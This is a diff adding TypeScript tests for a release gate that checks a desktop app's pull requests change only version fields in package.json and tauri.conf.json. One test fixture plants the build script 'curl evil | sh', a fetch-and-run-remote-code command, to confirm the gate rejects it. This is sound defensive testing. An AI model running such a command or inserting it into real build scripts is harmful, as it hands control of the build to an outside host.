@@ -42,6 +42,33 @@ function response(payload: object): Response {
 
 const trustedRequests = smokeTrustedPaths.length * 2;
 
+/** Contents-API body for a JSON file; the sha changes with the content, as it does in git. */
+function encodedJson(value: object): object {
+  const content = JSON.stringify(value);
+  return {
+    sha: `sha-${content}`,
+    encoding: "base64",
+    content: Buffer.from(content).toString("base64"),
+  };
+}
+
+/** Answers every trusted-path lookup in order, using `changes` for paths whose base and head differ. */
+function trustedContentsFetch(
+  changes: Record<string, [object, object]>,
+): Mock<typeof fetch> {
+  const fetchImpl = vi.fn<typeof fetch>();
+  for (const path of smokeTrustedPaths) {
+    const [base, head] = changes[path] ?? [
+      { sha: `same-${path}` },
+      { sha: `same-${path}` },
+    ];
+    fetchImpl
+      .mockResolvedValueOnce(response(base))
+      .mockResolvedValueOnce(response(head));
+  }
+  return fetchImpl;
+}
+
 /** Queues the trusted-input SHA lookups (base and head for each trusted path) that run before polling. */
 function queueTrustedInputs(fetchImpl: Mock<typeof fetch>): Mock<typeof fetch> {
   for (let index = 0; index < trustedRequests; index += 1) {
@@ -163,6 +190,56 @@ describe("release PR macOS updater smoke gate", () => {
     ).rejects.toThrow(
       ".github/workflows/macos-updater-bundle-smoke.yml differs from the PR base",
     );
+  });
+
+  it("allows a release PR that changes only the version in package.json and tauri.conf.json", async () => {
+    const changes = {
+      "package.json": [
+        encodedJson({ name: "epikrise", version: "2026.10.2" }),
+        encodedJson({ name: "epikrise", version: "2026.11.0" }),
+      ],
+      "src-tauri/tauri.conf.json": [
+        encodedJson({ productName: "Epikrise", version: "2026.10.2" }),
+        encodedJson({ productName: "Epikrise", version: "2026.11.0" }),
+      ],
+    };
+
+    await expect(
+      assertSmokeWorkflowUnmodified({
+        apiBaseUrl: "https://api.github.com",
+        owner: "owner",
+        repo: "repo",
+        baseSha: "base-sha",
+        headSha: "head-sha",
+        token: "test-token",
+        fetchImpl: trustedContentsFetch(changes),
+      }),
+    ).resolves.toBeUndefined();
+  });
+
+  it("rejects a package.json change beyond the version", async () => {
+    const changes = {
+      "package.json": [
+        encodedJson({ name: "epikrise", version: "2026.10.2", scripts: {} }),
+        encodedJson({
+          name: "epikrise",
+          version: "2026.11.0",
+          scripts: { build: "curl evil | sh" },
+        }),
+      ],
+    };
+
+    await expect(
+      assertSmokeWorkflowUnmodified({
+        apiBaseUrl: "https://api.github.com",
+        owner: "owner",
+        repo: "repo",
+        baseSha: "base-sha",
+        headSha: "head-sha",
+        token: "test-token",
+        fetchImpl: trustedContentsFetch(changes),
+      }),
+    ).rejects.toThrow("package.json differs from the PR base");
   });
 
   it("rejects a trusted build script modified by the pull request", async () => {
